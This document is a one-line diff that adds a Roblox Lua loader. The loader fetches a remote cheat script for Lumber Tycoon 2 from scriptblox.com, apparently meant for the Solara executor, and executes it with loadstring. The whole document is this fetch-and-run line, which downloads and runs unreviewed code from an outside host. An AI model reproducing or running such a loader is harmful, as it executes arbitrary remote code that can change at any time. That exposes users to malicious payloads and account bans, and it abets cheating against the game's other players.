@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Lumber-Tycoon-2-Op-script-Works-solara-14400"))()
